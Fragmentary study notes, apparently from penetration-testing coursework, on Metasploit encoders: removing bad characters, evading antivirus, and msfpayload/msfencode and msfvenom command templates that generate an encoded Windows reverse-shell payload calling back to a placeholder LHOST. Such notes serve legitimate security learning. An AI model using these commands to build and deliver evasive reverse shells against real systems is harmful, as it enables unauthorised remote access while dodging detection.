...
|---|---|---|---|---|
- encoders make payloads compatible with different processor architectures
- also used to remove hexadecimal opcodes known as bad characters from the payload
- helps with AV detection
    
    - has diminished over time
    
  
# Selecting and Encoder
- can create a custom payload through msfpayload
- have to encode to the target architecture using msfencode afterword
```Markdown
# Example
msfpayload windows/shell_reverse_tcp LHOST=<host> LPORT=<port> R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
```Markdown
...
## Creating a Payload Without Encoding
- msfvenom
```Markdown
msfvenom -a <architecture> --platform <platform> -p <payload> LHOST=<IP> LPORT=<port> -b "\x00" -f <filetype>
# Example
...
<SNIP>
```
- `-b` is to avoid bad characters, like “\x00”
  
## Creating a Payload With Encoding
- using the encoder shikata_ga_nai
```Markdown
msfvenom -a <architecture> --platform <platform> -p <payload> LHOST=<IP> LPORT=<port> -b "\x00" -f <filetype> -e <arch>/shikata_ga_nai
# Example
...
- can run a payload through multiple iterations of encoding with `-i`
```Markdown
